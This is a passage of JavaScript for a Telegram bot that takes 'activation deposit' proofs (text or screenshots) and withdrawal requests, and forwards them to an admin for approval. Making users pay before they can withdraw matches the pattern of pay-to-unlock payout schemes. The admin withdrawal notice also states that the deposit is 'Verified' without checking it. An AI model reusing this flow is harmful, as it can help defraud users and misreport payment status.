      const user = getUser(ctx.from.id) || getOrCreateUser(ctx.from).user;
      const settings = getAllSettings();
      const actAmount = Number(settings.activation_deposit_amount || 1.00);

      const deposit = createDeposit({
        user_id: user.id,
        user_name: user.username ? `@${user.username}` : user.first_name,
        amount: actAmount,
        method,
        proof: text
      });

      await ctx.reply(
        `✅ <b>Deposit Proof Submitted!</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 <b>Deposit ID:</b> <code>${deposit.id}</code>\n` +
        `💵 <b>Amount:</b> <b>${money(actAmount)}</b>\n` +
        `⚡️ <b>Method:</b> ${method}\n` +
        `📝 <b>Proof:</b> <code>${escapeHtml(text)}</code>\n\n` +
        `⏳ <i>Our admin team will verify your transaction and activate your account shortly (usually 5–15 mins).</i>`,
        {
          parse_mode: "HTML",
          ...getMainMenuReplyKeyboard(user)
        }
      );

      // Notify Admin
      bot.telegram.sendMessage(
        ADMIN_ID,
        `🔔 <b>NEW ACTIVATION DEPOSIT!</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 <b>ID:</b> <code>${deposit.id}</code>\n` +
        `👤 <b>User:</b> @${user.username || user.first_name} (ID: <code>${user.id}</code>)\n` +
        `💵 <b>Amount:</b> <b>${money(actAmount)}</b>\n` +
        `🌐 <b>Method:</b> ${method}\n` +
        `📝 <b>Proof:</b> <code>${escapeHtml(text)}</code>\n` +
        `👥 <b>Referrals:</b> ${user.referral_count || 0}`,
        {
          parse_mode: "HTML",
          ...Markup.inlineKeyboard([
            [Markup.button.callback("✅ Approve Deposit", `adm_dep_app:${deposit.id}`)],
            [Markup.button.callback("❌ Reject Deposit", `adm_dep_rej:${deposit.id}`)]
          ])
        }
      ).catch(() => {});

      return;
    }

    // User Withdrawal Destination Submission
    if (ctx.session?.withdrawState) {
      const { method, methodLabel, amount } = ctx.session.withdrawState;
      ctx.session.withdrawState = null;

      if (text.length < 5) {
        return ctx.reply("❌ Invalid address/ID format. Please tap Withdraw and try again.");
      }

      const user = getUser(ctx.from.id);
      if (!user || (user.wallet_balance || 0) < amount) {
        return ctx.reply("❌ Insufficient balance to process withdrawal.");
      }

      try {
        const { withdrawal } = createWithdrawal({
          user_id: user.id,
          user_name: user.username ? `@${user.username}` : user.first_name,
          amount,
          method,
          address: text
        });

        await ctx.reply(
          `✅ <b>WITHDRAWAL REQUEST SUBMITTED!</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `🆔 <b>Withdrawal ID:</b> <code>${withdrawal.id}</code>\n` +
          `💵 <b>Amount:</b> <b>${money(withdrawal.amount)}</b>\n` +
          `💳 <b>Method:</b> ${methodLabel}\n` +
          `📫 <b>Destination:</b> <code>${escapeHtml(text)}</code>\n` +
          `⏳ <b>Status:</b> Pending Admin Dispatch\n\n` +
          `<i>Your payout is queued and will be processed directly to your address within 15–30 minutes!</i>`,
          {
            parse_mode: "HTML",
            ...getMainMenuReplyKeyboard(user)
          }
        );

        // Notify Admin
        bot.telegram.sendMessage(
          ADMIN_ID,
          `🔔 <b>NEW WITHDRAWAL REQUEST!</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `🆔 <b>ID:</b> <code>${withdrawal.id}</code>\n` +
          `👤 <b>User:</b> @${user.username || user.first_name} (ID: <code>${user.id}</code>)\n` +
          `💵 <b>Amount:</b> <b>${money(withdrawal.amount)}</b>\n` +
          `🌐 <b>Method:</b> ${methodLabel}\n` +
          `📫 <b>Address:</b> <code>${escapeHtml(text)}</code>\n` +
          `👥 <b>Referrals:</b> ${user.referral_count || 0}\n` +
          `🛡️ <b>Deposit Status:</b> Activated ($1.00 Verified ✅)`,
          {
            parse_mode: "HTML",
            ...Markup.inlineKeyboard([
              [Markup.button.callback("✅ Approve & Mark Paid", `adm_wth_app:${withdrawal.id}`)],
              [Markup.button.callback("❌ Reject & Refund", `adm_wth_rej:${withdrawal.id}`)]
            ])
          }
        ).catch(() => {});
      } catch (err) {
        return ctx.reply(`❌ Withdrawal failed: ${err.message}`);
      }
      return;
    }

    return next();
  });

  // Photo upload handler for deposits
  bot.on("photo", async (ctx) => {
    if (ctx.session?.depositState?.step === "awaiting_proof") {
      const method = ctx.session.depositState.method;
      ctx.session.depositState = null;

      const user = getUser(ctx.from.id) || getOrCreateUser(ctx.from).user;
      const settings = getAllSettings();
      const actAmount = Number(settings.activation_deposit_amount || 1.00);

      const photos = ctx.message.photo;
      const largestPhoto = photos[photos.length - 1];
      const caption = ctx.message.caption || "Screenshot payment receipt";

      const deposit = createDeposit({
        user_id: user.id,
        user_name: user.username ? `@${user.username}` : user.first_name,
        amount: actAmount,
        method,
        proof: caption,
        photo_file_id: largestPhoto.file_id
      });

      await ctx.reply(
        `✅ <b>Deposit Screenshot Received!</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `🆔 <b>Deposit ID:</b> <code>${deposit.id}</code>\n` +
        `💵 <b>Amount:</b> <b>${money(actAmount)}</b>\n` +
        `⚡️ <b>Method:</b> ${method}\n\n` +
        `⏳ <i>Our admin team will review your payment receipt and activate your account shortly!</i>`,
        {
          parse_mode: "HTML",
          ...getMainMenuReplyKeyboard(user)
        }
      );

      // Forward receipt to Admin with actions
      bot.telegram.sendPhoto(ADMIN_ID, largestPhoto.file_id, {
        caption:
          `🔔 <b>NEW ACTIVATION DEPOSIT (SCREENSHOT)</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━\n` +
          `🆔 <b>ID:</b> <code>${deposit.id}</code>\n` +
          `👤 <b>User:</b> @${user.username || user.first_name} (ID: <code>${user.id}</code>)\n` +
          `💵 <b>Amount:</b> <b>${money(actAmount)}</b>\n` +
          `🌐 <b>Method:</b> ${method}\n` +
          `📝 <b>Caption:</b> ${escapeHtml(caption)}`,
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("✅ Approve Deposit", `adm_dep_app:${deposit.id}`)],
          [Markup.button.callback("❌ Reject Deposit", `adm_dep_rej:${deposit.id}`)]
        ])
      }).catch(() => {});
    }
  });
}

module.exports = {
  showReferralScreen,
  showAccountScreen,
  showWithdrawScreen,
  showDepositScreen,
  registerUserHandlers
};

